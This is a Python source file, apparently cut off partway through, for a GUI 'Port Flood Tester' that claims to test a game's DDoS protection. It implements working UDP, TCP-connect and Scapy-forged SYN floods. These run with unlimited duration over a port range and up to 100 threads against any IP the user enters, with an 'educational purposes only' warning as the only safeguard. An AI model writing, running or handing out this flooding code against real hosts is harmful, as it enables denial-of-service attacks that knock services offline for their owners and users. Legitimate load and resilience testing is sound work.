#!/usr/bin/env python3
"""
Port Flooding Test Script (GUI Version)

This script generates moderate traffic to test game DDoS prevention.
For EDUCATIONAL PURPOSES ONLY. Use only on systems you own or have permission to test.
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import socket
import threading
import time
import queue
from concurrent.futures import ThreadPoolExecutor
import sys
import logging
from datetime import datetime, timedelta
from enum import Enum
from typing import Optional, Dict, Any
import os
import platform
import warnings
import psutil
from collections import deque
import logging.handlers
import traceback

try:
    from scapy.all import IP, TCP, RandShort, Raw, send, conf
    import scapy.arch.windows as windows
    from scapy.arch import get_if_addr, get_if_list
    
    # Configure Scapy for Windows
    if platform.system() == "Windows":
        try:
            # Try to load Npcap first
            conf.use_npcap = True
            if hasattr(conf, 'load_npcap'):
                conf.load_npcap()
            
            # Fallback to WinPcap if Npcap not available
            if not conf.use_npcap:
                if hasattr(conf, 'load_winpcap'):
                    conf.load_winpcap()
        except Exception as e:
            warnings.warn(f"Failed to initialize packet capture: {e}")
    
    SCAPY_AVAILABLE = True
except ImportError as e:
    warnings.warn(f"Scapy import failed: {e}. SYN flooding will be disabled.")
    SCAPY_AVAILABLE = False
except Exception as e:
    warnings.warn(f"Unexpected error initializing Scapy: {e}. SYN flooding will be disabled.")
    SCAPY_AVAILABLE = False

class ErrorLevel(Enum):
    """Error severity levels."""
    INFO = "INFO"
    WARNING = "WARNING"
    ERROR = "ERROR"
    CRITICAL = "CRITICAL"

class FloodTesterError:
    """Centralized error handling class."""
    def __init__(self, message: str, level: ErrorLevel, details: Optional[Dict[str, Any]] = None):
        self.message = message
        self.level = level
        self.details = details or {}
        self.timestamp = datetime.now()
        self.recovered = False
        self.recovery_attempts = 0

    def __str__(self):
        return f"[{self.level.value}] {self.message}"

class ErrorManager:
    """Manages error handling and recovery strategies."""
    def __init__(self, gui):
        self.gui = gui
        self.errors: Dict[str, FloodTesterError] = {}
        self.max_recovery_attempts = 3
        
        # Configure logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        
        # Error recovery strategies
        self.recovery_strategies = {
            "socket_error": self._handle_socket_error,
            "interface_error": self._handle_interface_error,
            "permission_error": self._handle_permission_error,
            "resource_error": self._handle_resource_error,
            "network_error": self._handle_network_error
        }

    def handle_error(self, error_type: str, message: str, level: ErrorLevel, 
                    details: Optional[Dict[str, Any]] = None) -> bool:
        """Handle an error and attempt recovery if possible."""
        error = FloodTesterError(message, level, details)
        self.errors[error_type] = error
        
        # Log the error
        log_level = getattr(logging, level.value)
        logging.log(log_level, f"{error_type}: {message}")
        
        # Update GUI
        self.gui.update_error_display(error)
        
        # Attempt recovery if strategy exists
        if error_type in self.recovery_strategies:
            return self.attempt_recovery(error_type)
        return False

    def attempt_recovery(self, error_type: str) -> bool:
        """Attempt to recover from an error."""
        error = self.errors.get(error_type)
        if not error or error.recovery_attempts >= self.max_recovery_attempts:
            return False
            
        error.recovery_attempts += 1
        try:
            success = self.recovery_strategies[error_type](error)
            error.recovered = success
            return success
        except Exception as e:
            logging.error(f"Recovery failed for {error_type}: {e}")
            return False

    def _handle_socket_error(self, error: FloodTesterError) -> bool:
        """Handle socket-related errors."""
        try:
            if "Connection refused" in error.message:
                # Wait and retry
                time.sleep(1)
                return True
            elif "Address already in use" in error.message:
                # Try different port
                return True
        except:
            return False
        return False

    def _handle_interface_error(self, error: FloodTesterError) -> bool:
        """Handle network interface errors."""
        try:
            # Attempt to refresh interface list
            self.gui.interfaces = self.gui.get_network_interfaces()
            if self.gui.interfaces:
                self.gui.interface_combo['values'] = [
                    f"{i['name']} - {i['description']}" 
                    for i in self.gui.interfaces
                ]
                self.gui.interface_combo.set(self.gui.interface_combo['values'][0] if self.gui.interfaces else "")
                return True
        except:
            return False
        return False

    def _handle_permission_error(self, error: FloodTesterError) -> bool:
        """Handle permission-related errors."""
        if "Access is denied" in error.message:
            messagebox.showwarning(
                "Permission Error",
                "This operation requires administrator privileges.\n"
                "Please restart the application as administrator."
            )
        return False

    def _handle_resource_error(self, error: FloodTesterError) -> bool:
        """Handle resource exhaustion errors."""
        try:
            if "Too many open files" in error.message:
                # Reduce thread count
                new_threads = max(1, int(self.gui.threads.get()) // 2)
                self.gui.threads.delete(0, tk.END)
                self.gui.threads.insert(0, str(new_threads))
                return True
        except:
            return False
        return False

    def _handle_network_error(self, error: FloodTesterError) -> bool:
        """Handle general network errors."""
        try:
            if "Network is unreachable" in error.message:
                # Wait and retry
                time.sleep(2)
                return True
        except:
            return False
        return False

class RedirectText:
    def __init__(self, text_widget, queue):
        self.text_widget = text_widget
        self.queue = queue

    def write(self, string):
        self.queue.put(string)

    def flush(self):
        pass

def flood_port_udp(target_ip, port, packet_size, duration, delay):
    """Send UDP traffic to a specific port on the target IP."""
    end_time = time.time() + duration if duration != float("inf") else float("inf")
    packet = b"X" * packet_size
    
    try:
        # Create a UDP socket connection
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packets_sent = 0
        print(f"Starting UDP traffic to {target_ip}:{port}")
        
        while time.time() < end_time:
            try:
                sock.sendto(packet, (target_ip, port))
                packets_sent += 1
                time.sleep(delay)
            except Exception as e:
                print(f"Error sending to {port}: {e}")
                break
                
        print(f"Completed sending {packets_sent} UDP packets to {target_ip}:{port}")
        
    except Exception as e:
        print(f"Error creating socket for {port}: {e}")
    finally:
        sock.close()

def flood_port_tcp(target_ip, port, packet_size, duration, delay):
    """Send TCP traffic to a specific port."""
    end_time = time.time() + duration if duration != float("inf") else float("inf")
    packet = b"X" * packet_size
    
    print(f"Starting TCP traffic to {target_ip}:{port}")
    packets_sent = 0
    
    while time.time() < end_time:
        try:
            # Create a new TCP socket for each connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)  # Set timeout for connection attempts
            sock.connect((target_ip, port))
            sock.send(packet)
            packets_sent += 1
            sock.close()
            time.sleep(delay)
        except Exception as e:
            # Silently handle connection errors
            pass
            
    print(f"Completed sending {packets_sent} TCP packets to {target_ip}:{port}")

class PerformanceMetrics:
    """Container for performance metrics."""
    def __init__(self):
        self.packets_per_second = 0
        self.bandwidth_bps = 0
        self.cpu_usage = 0
        self.memory_usage = 0
        self.packet_loss = 0
        self.timestamp = datetime.now()

class PerformanceMonitor:
    """Monitors and tracks performance metrics."""
    def __init__(self, window_size=60):
        self.window_size = window_size
        self.metrics_history = deque(maxlen=window_size)
        self.last_packets_sent = 0
        self.last_bytes_sent = 0
        self.last_update = datetime.now()
        self.running = False
        self.lock = threading.Lock()
        
        # Initialize system monitoring
        self.process = psutil.Process()
        
    def start(self):
        """Start performance monitoring."""
        self.running = True
        self.monitor_thread = threading.Thread(target=self._monitor_loop, daemon=True)
        self.monitor_thread.start()
        
    def stop(self):
        """Stop performance monitoring."""
        self.running = False
        if hasattr(self, 'monitor_thread'):
            self.monitor_thread.join(timeout=1)
    
    def _monitor_loop(self):
        """Main monitoring loop."""
        while self.running:
            self.update_metrics()
            time.sleep(1)
    
    def update_metrics(self):
        """Update performance metrics."""
        with self.lock:
            current_time = datetime.now()
            metrics = PerformanceMetrics()
            
            # Calculate packets per second
            packets_sent = self.get_total_packets()
            time_diff = (current_time - self.last_update).total_seconds()
            if time_diff > 0:
                metrics.packets_per_second = (packets_sent - self.last_packets_sent) / time_diff
            
            # Calculate bandwidth (bytes per second)
            bytes_sent = self.get_total_bytes()
            if time_diff > 0:
                metrics.bandwidth_bps = (bytes_sent - self.last_bytes_sent) / time_diff
            
            # System metrics
            metrics.cpu_usage = self.process.cpu_percent()
            metrics.memory_usage = self.process.memory_percent()
            
            # Update historical values
            self.last_packets_sent = packets_sent
            self.last_bytes_sent = bytes_sent
            self.last_update = current_time
            
            # Store metrics
            metrics.timestamp = current_time
            self.metrics_history.append(metrics)
    
    def get_total_packets(self):
        """Get total packets sent."""
        return sum(net_io.packets_sent for net_io in psutil.net_io_counters(pernic=True).values())
    
    def get_total_bytes(self):
        """Get total bytes sent."""
        return sum(net_io.bytes_sent for net_io in psutil.net_io_counters(pernic=True).values())
    
    def get_current_metrics(self):
        """Get the most recent metrics."""
        with self.lock:
            if self.metrics_history:
                return self.metrics_history[-1]
            return PerformanceMetrics()
    
    def get_average_metrics(self, seconds=5):
        """Get average metrics over the specified time window."""
        with self.lock:
            if not self.metrics_history:
                return PerformanceMetrics()
            
            cutoff_time = datetime.now() - timedelta(seconds=seconds)
            recent_metrics = [m for m in self.metrics_history if m.timestamp >= cutoff_time]
            
            if not recent_metrics:
                return PerformanceMetrics()
            
            avg_metrics = PerformanceMetrics()
            avg_metrics.packets_per_second = sum(m.packets_per_second for m in recent_metrics) / len(recent_metrics)
            avg_metrics.bandwidth_bps = sum(m.bandwidth_bps for m in recent_metrics) / len(recent_metrics)
            avg_metrics.cpu_usage = sum(m.cpu_usage for m in recent_metrics) / len(recent_metrics)
            avg_metrics.memory_usage = sum(m.memory_usage for m in recent_metrics) / len(recent_metrics)
            
            return avg_metrics

class FloodTesterGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Port Flood Tester")
        self.root.geometry("1000x800")  # Increased size for new features
        
        # Variables
        self.is_running = False
        self.executor = None
        self.log_queue = queue.Queue()
        self.status_var = tk.StringVar(value="Ready")
        self.total_packets_sent = 0
        self.error_count = 0
        self.mode_var = tk.StringVar(value="udp")  # Initialize mode_var early
        self.max_retries = tk.StringVar(value="3")  # Add max_retries variable
        
        # Add error manager
        self.error_manager = ErrorManager(self)
        
        # Check for administrator privileges if on Windows
        if platform.system() == "Windows" and not self._is_admin():
            warnings.warn("Running without administrator privileges. Some features may be limited.")
        
        # Create main frame
        main_frame = ttk.Frame(root, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Create left and right frames
        left_frame = ttk.Frame(main_frame)
        left_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), padx=5)
        
        right_frame = ttk.Frame(main_frame)
        right_frame.grid(row=0, column=1, sticky=(tk.W, tk.E, tk.N, tk.S), padx=5)
        
        # Status bar at the bottom
        self.create_status_bar(main_frame)
        
        # Initialize interfaces before creating interface selection
        self.interfaces = self.get_network_interfaces()
        
        # Create components in correct order
        self.create_input_fields(left_frame)
        self.create_mode_selection(left_frame)  # Create mode selection before interface selection
        self.create_interface_selection(left_frame)
        self.create_buttons(left_frame)
        
        # Right frame components
        self.create_status_indicators(right_frame)
        self.create_log_display(right_frame)
        self.create_error_display(right_frame)
        self.create_performance_display(right_frame)
        
        # Configure mode change callback
        self.mode_var.trace_add("write", self.update_interface_visibility)
        
        # Start queue processing
        self.process_queue()
        
        # Configure grid
        self.configure_grid()
        
        # Warning message
        self.show_warning()
        
        # Update status periodically
        self.update_status()
        
        # Initialize performance monitor
        self.perf_monitor = PerformanceMonitor()

    def create_status_bar(self, parent):
        """Create status bar at the bottom."""
        status_frame = ttk.Frame(parent)
        status_frame.grid(row=1, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(5,0))
        
        ttk.Label(status_frame, textvariable=self.status_var).pack(side=tk.LEFT)
        
        # Progress bar
        self.progress_var = tk.DoubleVar()
        self.progress = ttk.Progressbar(status_frame, mode='indeterminate', 
                                      variable=self.progress_var)
        self.progress.pack(side=tk.RIGHT, fill=tk.X, expand=True, padx=5)

    def create_input_fields(self, parent):
        # Target IP
        ttk.Label(parent, text="Target IP:").grid(row=0, column=0, sticky=tk.W)
        self.target_ip = ttk.Entry(parent)
        self.target_ip.insert(0, "127.0.0.1")
        self.target_ip.grid(row=0, column=1, sticky=(tk.W, tk.E))
        
        # Port range
        ttk.Label(parent, text="Port Range:").grid(row=1, column=0, sticky=tk.W)
        port_frame = ttk.Frame(parent)
        port_frame.grid(row=1, column=1, sticky=(tk.W, tk.E))
        
        self.port_start = ttk.Entry(port_frame, width=10)
        self.port_start.insert(0, "6520")
        self.port_start.pack(side=tk.LEFT)
        
        ttk.Label(port_frame, text=" - ").pack(side=tk.LEFT)
        
        self.port_end = ttk.Entry(port_frame, width=10)
        self.port_end.insert(0, "6540")
        self.port_end.pack(side=tk.LEFT)
        
        # Packet size
        ttk.Label(parent, text="Packet Size (bytes):").grid(row=2, column=0, sticky=tk.W)
        self.packet_size = ttk.Entry(parent)
        self.packet_size.insert(0, "1024")
        self.packet_size.grid(row=2, column=1, sticky=(tk.W, tk.E))
        
        # Thread count
        ttk.Label(parent, text="Threads:").grid(row=3, column=0, sticky=tk.W)
        self.threads = ttk.Entry(parent)
        self.threads.insert(0, "5")
        self.threads.grid(row=3, column=1, sticky=(tk.W, tk.E))
        
        # Delay
        ttk.Label(parent, text="Delay (seconds):").grid(row=4, column=0, sticky=tk.W)
        self.delay = ttk.Entry(parent)
        self.delay.insert(0, "0.01")
        self.delay.grid(row=4, column=1, sticky=(tk.W, tk.E))
        
        # Max retries
        ttk.Label(parent, text="Max Retries:").grid(row=5, column=0, sticky=tk.W)
        retry_frame = ttk.Frame(parent)
        retry_frame.grid(row=5, column=1, sticky=(tk.W, tk.E))
        
        self.max_retries_spinbox = ttk.Spinbox(retry_frame, from_=1, to=10, width=5, 
                                              textvariable=self.max_retries)
        self.max_retries_spinbox.pack(side=tk.LEFT)
        ttk.Label(retry_frame, text="(for SYN flooding)").pack(side=tk.LEFT, padx=5)

    def create_mode_selection(self, parent):
        """Create mode selection frame."""
        mode_frame = ttk.LabelFrame(parent, text="Flood Mode", padding="5")
        mode_frame.grid(row=6, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=10)
        
        ttk.Radiobutton(mode_frame, text="UDP", variable=self.mode_var, value="udp").pack(side=tk.LEFT, padx=5)
        ttk.Radiobutton(mode_frame, text="TCP", variable=self.mode_var, value="tcp").pack(side=tk.LEFT, padx=5)
        
        if SCAPY_AVAILABLE:
            ttk.Radiobutton(mode_frame, text="SYN", variable=self.mode_var, value="syn").pack(side=tk.LEFT, padx=5)
        
        ttk.Radiobutton(mode_frame, text="All", variable=self.mode_var, value="all").pack(side=tk.LEFT, padx=5)

    def create_interface_selection(self, parent):
        """Create enhanced network interface selection frame."""
        self.interface_frame = ttk.LabelFrame(parent, text="Network Interface (for SYN flooding)", padding="5")
        self.interface_frame.grid(row=5, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=5)
        
        # Interface selection mode
        mode_frame = ttk.Frame(self.interface_frame)
        mode_frame.pack(fill=tk.X, pady=2)
        
        self.interface_var = tk.StringVar(value="auto")
        ttk.Radiobutton(mode_frame, text="Auto-detect", 
                       variable=self.interface_var, 
                       value="auto",
                       command=self.update_interface_status).pack(side=tk.LEFT, padx=5)
        
        ttk.Radiobutton(mode_frame, text="Manual Selection", 
                       variable=self.interface_var, 
                       value="manual",
                       command=self.update_interface_status).pack(side=tk.LEFT, padx=5)
        
        # Interface dropdown and status
        selection_frame = ttk.Frame(self.interface_frame)
        selection_frame.pack(fill=tk.X, pady=2)
        
        # Interface dropdown with friendly names
        self.interface_combo = ttk.Combobox(selection_frame, width=40)
        if self.interfaces:
            self.interface_combo['values'] = [
                f"{i['friendly_name']} ({i['ip']})" for i in self.interfaces
            ]
            self.interface_combo.set(self.interface_combo['values'][0] if self.interfaces else "")
        self.interface_combo.pack(side=tk.LEFT, padx=5)
        
        # Refresh button
        self.refresh_btn = ttk.Button(selection_frame, text="↻", width=3,
                                    command=self.refresh_interfaces)
        self.refresh_btn.pack(side=tk.LEFT, padx=2)
        
        # Status indicator
        self.interface_status = ttk.Label(self.interface_frame, text="Status: Ready")
        self.interface_status.pack(fill=tk.X, pady=2)
        
        # Initially hide if not using SYN mode
        if not SCAPY_AVAILABLE or self.mode_var.get() not in ['syn', 'all']:
            self.interface_frame.grid_remove()
        
        # Bind events
        self.interface_combo.bind('<<ComboboxSelected>>', self.validate_interface)
        self.update_interface_status()

    def update_interface_visibility(self, *args):
        """Show/hide interface selection based on mode."""
        if SCAPY_AVAILABLE and self.mode_var.get() in ['syn', 'all']:
            self.interface_frame.grid()
        else:
            self.interface_frame.grid_remove()

    def normalize_interface_name(self, name):
        """Normalize interface name for consistent comparison."""
        if not name:
            return ""
        # Convert backslashes to forward slashes for consistency
        name = name.replace('\\', '/')
        # Remove Device/NPF_ prefix if present
        name = name.replace('Device/NPF_', '')
        # Remove any curly braces
        name = name.replace('{', '').replace('}', '')
        # Remove any leading/trailing whitespace
        name = name.strip()
        # Convert to lowercase for case-insensitive comparison
        return name.lower()

    def get_selected_interface(self):
        """Get the selected network interface name with validation."""
        try:
            if self.interface_var.get() == "auto":
                # Try to auto-detect a suitable interface
                if self.interfaces:
                    # Prefer interfaces with non-loopback IPs
                    for interface in self.interfaces:
                        if interface['ip'] and interface['ip'] not in ('127.0.0.1', '0.0.0.0'):
                            self.interface_status.config(
                                text=f"Status: Auto-detected interface: {interface['friendly_name']} ({interface['ip']})",
                                foreground="dark green"
                            )
                            return interface['name']  # Return the Scapy interface name
                    return None
            else:
                # Get manually selected interface from combobox
                selected = self.interface_combo.get()
                # Find the interface details from our stored interfaces
                for interface in self.interfaces:
                    display_name = f"{interface['friendly_name']} ({interface['ip']})"
                    if selected == display_name:
                        return interface['name']  # Return the Scapy interface name
                return None
        except Exception as e:
            logging.error(f"Error getting selected interface: {e}")
            return None

    def create_buttons(self, parent):
        button_frame = ttk.Frame(parent)
        button_frame.grid(row=7, column=0, columnspan=2, pady=10)
        
        self.start_button = ttk.Button(button_frame, text="Start", command=self.start_test)
        self.start_button.pack(side=tk.LEFT, padx=5)
        
        self.stop_button = ttk.Button(button_frame, text="Stop", command=self.stop_test, state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=5)
        
        ttk.Button(button_frame, text="Clear Log", command=self.clear_log).pack(side=tk.LEFT, padx=5)

    def create_log_display(self, parent):
        """Enhanced log display with filtering and search."""
        log_frame = ttk.LabelFrame(parent, text="Log", padding="5")
        log_frame.grid(row=2, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), pady=5)
        
        # Log controls
        control_frame = ttk.Frame(log_frame)
        control_frame.pack(fill=tk.X, pady=2)
        
        # Log level filter
        ttk.Label(control_frame, text="Level:").pack(side=tk.LEFT)
        self.log_level = ttk.Combobox(control_frame, values=["All", "Info", "Error", "Debug"])
        self.log_level.set("All")
        self.log_level.pack(side=tk.LEFT, padx=5)
        
        # Search box
        ttk.Label(control_frame, text="Search:").pack(side=tk.LEFT, padx=(10,0))
        self.log_search = ttk.Entry(control_frame)
        self.log_search.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        # Clear button moved to control frame
        ttk.Button(control_frame, text="Clear Log", 
                  command=self.clear_log).pack(side=tk.RIGHT)
        
        # Log text area
        self.log_text = scrolledtext.ScrolledText(log_frame, height=20)
        self.log_text.pack(fill=tk.BOTH, expand=True, pady=5)
        
        # Add right-click menu
        self.create_log_context_menu()

    def create_log_context_menu(self):
        """Create right-click context menu for log."""
        self.log_menu = tk.Menu(self.root, tearoff=0)
        self.log_menu.add_command(label="Copy", command=self.copy_log_selection)
        self.log_menu.add_command(label="Save Log", command=self.save_log)
        self.log_menu.add_separator()
        self.log_menu.add_command(label="Clear", command=self.clear_log)
        
        self.log_text.bind("<Button-3>", self.show_log_menu)

    def show_log_menu(self, event):
        """Show the log context menu."""
        self.log_menu.post(event.x_root, event.y_root)

    def copy_log_selection(self):
        """Copy selected log text to clipboard."""
        try:
            selected = self.log_text.get(tk.SEL_FIRST, tk.SEL_LAST)
            self.root.clipboard_clear()
            self.root.clipboard_append(selected)
        except tk.TclError:
            pass  # No selection

    def save_log(self):
        """Save log contents to file."""
        from tkinter import filedialog
        filename = filedialog.asksaveasfilename(
            defaultextension=".log",
            filetypes=[("Log files", "*.log"), ("All files", "*.*")]
        )
        if filename:
            with open(filename, 'w') as f:
                f.write(self.log_text.get(1.0, tk.END))

    def configure_grid(self):
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)

    def show_warning(self):
        warning = "WARNING: This tool is for educational purposes only.\n\n"
        warning += "It should ONLY be used on systems you own or have explicit permission to test."
        messagebox.showwarning("Warning", warning)

    def process_queue(self):
        while True:
            try:
                message = self.log_queue.get_nowait()
                self.log_text.insert(tk.END, message)
                self.log_text.see(tk.END)
            except queue.Empty:
                break
        self.root.after(100, self.process_queue)

    def validate_inputs(self):
        """Enhanced input validation with error handling."""
        try:
            port_start = int(self.port_start.get())
            port_end = int(self.port_end.get())
            packet_size = int(self.packet_size.get())
            threads = int(self.threads.get())
            delay = float(self.delay.get())
            
            if port_start > port_end:
                self.error_manager.handle_error(
                    "validation_error",
                    "Start port must be less than or equal to end port",
                    ErrorLevel.ERROR
                )
                return False
                
            if port_start < 0 or port_end > 65535:
                self.error_manager.handle_error(
                    "validation_error",
                    "Ports must be between 0 and 65535",
                    ErrorLevel.ERROR
                )
                return False
                
            if packet_size <= 0:
                self.error_manager.handle_error(
                    "validation_error",
                    "Packet size must be positive",
                    ErrorLevel.ERROR
                )
                return False
                
            if packet_size > 65507:
                self.error_manager.handle_error(
                    "validation_error",
                    "Packet size too large (max 65507 bytes)",
                    ErrorLevel.ERROR
                )
                return False
                
            if threads <= 0:
                self.error_manager.handle_error(
                    "validation_error",
                    "Thread count must be positive",
                    ErrorLevel.ERROR
                )
                return False
                
            if threads > 100:
                self.error_manager.handle_error(
                    "validation_error",
                    "Too many threads (max 100)",
                    ErrorLevel.WARNING,
                    {"current": threads, "max": 100}
                )
                return False
                
            if delay < 0:
                self.error_manager.handle_error(
                    "validation_error",
                    "Delay must be non-negative",
                    ErrorLevel.ERROR
                )
                return False
                
            return True
            
        except ValueError as e:
            self.error_manager.handle_error(
                "validation_error",
                f"Invalid input: {str(e)}",
                ErrorLevel.ERROR
            )
            return False

    def start_test(self):
        if not self.validate_inputs():
            return
            
        self.is_running = True
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        
        # Start performance monitoring
        self.perf_monitor.start()
        
        # Create thread pool
        self.executor = ThreadPoolExecutor(max_workers=int(self.threads.get()))
        
        # Start flooding in background thread
        threading.Thread(target=self.run_flood_test, daemon=True).start()

    def stop_test(self):
        self.is_running = False
        if self.executor:
            self.executor.shutdown(wait=False)
        
        # Stop performance monitoring
        self.perf_monitor.stop()
        
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.log_text.insert(tk.END, "\nTest stopped by user.\n")

    def clear_log(self):
        self.log_text.delete(1.0, tk.END)

    def run_flood_test(self):
        target_ip = self.target_ip.get()
        port_start = int(self.port_start.get())
        port_end = int(self.port_end.get())
        packet_size = int(self.packet_size.get())
        delay = float(self.delay.get())
        mode = self.mode_var.get()
        interface = self.get_selected_interface()
        
        ports = range(port_start, port_end + 1)
        
        # Redirect print statements to log
        old_stdout = sys.stdout
        sys.stdout = RedirectText(self.log_text, self.log_queue)
        
        try:
            for port in ports:
                if not self.is_running:
                    break
                    
                if mode in ["udp", "all"]:
                    self.executor.submit(
                        flood_port_udp,
                        target_ip,
                        port,
                        packet_size,
                        float("inf"),
                        delay
                    )
                
                if mode in ["tcp", "all"]:
                    self.executor.submit(
                        flood_port_tcp,
                        target_ip,
                        port,
                        packet_size,
                        float("inf"),
                        delay
                    )
                    
                if mode in ["syn", "all"] and SCAPY_AVAILABLE:
                    self.executor.submit(
                        self.syn_flood,
                        target_ip,
                        port,
                        packet_size,
                        float("inf"),
                        delay,
                        interface
                    )
        finally:
            sys.stdout = old_stdout
            if self.is_running:
                self.stop_test()

    def get_network_interfaces(self):
        """Enhanced network interface detection with detailed logging."""
        interfaces = []
        
        if not SCAPY_AVAILABLE:
            logging.error("Scapy is not installed. Network interface detection will be limited.")
            return interfaces
            
        try:
            # For Windows, try Windows-specific method first
            if platform.system() == "Windows":
                try:
                    logging.debug("Starting Windows interface detection...")
                    
                    # Get both Windows interface list and Scapy interface list
                    win_interfaces = windows.get_windows_if_list()
                    scapy_interfaces = get_if_list()
                    
                    logging.debug(f"Found {len(win_interfaces)} Windows interfaces")
                    logging.debug(f"Found {len(scapy_interfaces)} Scapy interfaces")
                    
                    # Create a mapping of normalized names to interface info
                    interface_map = {}
                    
                    # First, process Windows interfaces
                    for win_if in win_interfaces:
                        if win_if.get('name') and win_if.get('ips'):
                            norm_name = self.normalize_interface_name(win_if['name'])
                            if norm_name:
                                interface_map[norm_name] = {
                                    'win_name': win_if['name'],
                                    'friendly_name': win_if.get('description', win_if['name']),
                                    'ips': win_if.get('ips', []),
                                    'scapy_name': None
                                }
                    
                    # Then, try to match Scapy interfaces
                    for scapy_if in scapy_interfaces:
                        norm_scapy = self.normalize_interface_name(scapy_if)
                        if not norm_scapy:
                            continue
                            
                        # Try to get the IP using Scapy
                        try:
                            scapy_ip = get_if_addr(scapy_if)
                        except Exception as e:
                            logging.debug(f"Could not get IP for {scapy_if}: {e}")
                            scapy_ip = None
                        
                        # Try to match with Windows interface
                        matched = False
                        for norm_win, info in interface_map.items():
                            if (norm_scapy == norm_win or  # Exact match
                                norm_scapy in norm_win or  # Partial match
                                (scapy_ip and scapy_ip in info['ips'])):  # IP match
                                info['scapy_name'] = scapy_if
                                matched = True
                                logging.debug(f"Matched {scapy_if} to {info['win_name']}")
                                break
                        
                        if not matched and scapy_ip and scapy_ip not in ('127.0.0.1', '0.0.0.0'):
                            # Add as a new interface if it has a valid IP
                            norm_name = f"scapy_{norm_scapy}"
                            interface_map[norm_name] = {
                                'win_name': scapy_if,
                                'friendly_name': scapy_if,
                                'ips': [scapy_ip],
                                'scapy_name': scapy_if
                            }
                    
                    # Create final interface list, excluding loopback adapters
                    for info in interface_map.values():
                        if info['scapy_name'] and info['ips']:  # Only include interfaces with both names and IPs
                            valid_ips = [ip for ip in info['ips'] if ip not in ('127.0.0.1', '0.0.0.0')]
                            if valid_ips and 'loopback' not in info['friendly_name'].lower():
                                interface_info = {
                                    'name': info['scapy_name'],  # Use Scapy name for actual operations
                                    'win_name': info['win_name'],
                                    'friendly_name': info['friendly_name'],
                                    'description': f"IPs: {', '.join(valid_ips)}",
                                    'ip': valid_ips[0]  # Use first valid IP
                                }
                                interfaces.append(interface_info)
                                logging.debug(f"Added interface: {interface_info}")
                
                except Exception as e:
                    log_exception(e, "Windows interface detection")
            
            # Fallback to generic method if no interfaces found
            if not interfaces:
                logging.debug("\nFalling back to generic interface detection")
                if_list = get_if_list()
                for iface in if_list:
                    try:
                        addr = get_if_addr(iface)
                        if addr and addr not in ('127.0.0.1', '0.0.0.0') and 'loopback' not in iface.lower():
                            interface_info = {
                                'name': iface,
                                'win_name': iface,
                                'friendly_name': iface,
                                'description': f"IP: {addr}",
                                'ip': addr
                            }
                            interfaces.append(interface_info)
                            logging.debug(f"Added fallback interface: {interface_info}")
                    except Exception as e:
                        log_exception(e, f"Getting address for {iface}")
            
            # Log final interface list
            logging.debug("\nFinal Interface List:")
            for idx, iface in enumerate(interfaces):
                logging.debug(f"\nInterface {idx + 1}:")
                logging.debug(f"  Scapy Name: {iface['name']}")
                logging.debug(f"  Windows Name: {iface['win_name']}")
                logging.debug(f"  Friendly Name: {iface['friendly_name']}")
                logging.debug(f"  IP: {iface['ip']}")
            
            if not interfaces:
                logging.warning("No valid network interfaces found")
            else:
                logging.info(f"Successfully found {len(interfaces)} valid interfaces")
            
        except Exception as e:
            log_exception(e, "Network interface detection")
        
        return interfaces

    def syn_flood(self, target_ip, port, packet_size, duration, delay, interface=None):
        """Enhanced SYN flood with comprehensive error handling and recovery."""
        if not SCAPY_AVAILABLE:
            self.error_manager.handle_error(
                "scapy_error",
                "Scapy is not installed. SYN flooding requires: pip install scapy",
                ErrorLevel.ERROR
            )
            return
            
        end_time = time.time() + duration if duration != float("inf") else float("inf")
        packets_sent = 0
        retry_count = 0
        max_retries = int(self.max_retries.get())
        
        # Validate and configure interface
        try:
            if interface:
                # Verify the interface exists in Scapy's interface list
                available_interfaces = get_if_list()
                norm_interface = self.normalize_interface_name(interface)
                
                # Find matching interface
                selected_interface = None
                for avail_if in available_interfaces:
                    if self.normalize_interface_name(avail_if) == norm_interface:
                        selected_interface = avail_if
                        break
                
                if not selected_interface:
                    # Try using the interface directly
                    if interface in available_interfaces:
                        selected_interface = interface
                    else:
                        raise ValueError(f"Interface {interface} not found in Scapy interfaces")
            else:
                # Auto-detect interface
                selected_interface = None
                available_interfaces = get_if_list()
                
                # Try to find a suitable interface
                for iface in available_interfaces:
                    try:
                        addr = get_if_addr(iface)
                        if addr not in ('127.0.0.1', '0.0.0.0') and 'loopback' not in iface.lower():
                            selected_interface = iface
                            break
                    except Exception:
                        continue
                
                if not selected_interface:
                    raise ValueError("No suitable network interface found")
            
            # Get friendly name for logging
            friendly_name = None
            for iface in self.interfaces:
                if self.normalize_interface_name(iface['name']) == self.normalize_interface_name(selected_interface):
                    friendly_name = iface['friendly_name']
                    break
            
            print(f"Using interface: {friendly_name or selected_interface}")
            
        except Exception as e:
            self.error_manager.handle_error(
                "interface_error",
                f"Interface configuration error: {str(e)}",
                ErrorLevel.ERROR,
                {"attempted_interface": interface}
            )
            return
        
        # Forge IP and TCP layers with error handling
        try:
            # Validate IP address format
            try:
                socket.inet_aton(target_ip)
            except socket.error:
                raise ValueError(f"Invalid IP address format: {target_ip}")
            
            # Validate port range
            if not (0 <= port <= 65535):
                raise ValueError(f"Invalid port number: {port}")
            
            # Create packet
            ip = IP(dst=target_ip)
            tcp = TCP(sport=RandShort(), dport=port, flags="S")
            raw = Raw(b"X" * min(packet_size, 1460))  # Limit to typical MTU
            packet = ip / tcp / raw
            
        except Exception as e:
            self.error_manager.handle_error(
                "packet_error",
                f"Error creating packet: {str(e)}",
                ErrorLevel.ERROR,
                {
                    "target_ip": target_ip,
                    "port": port,
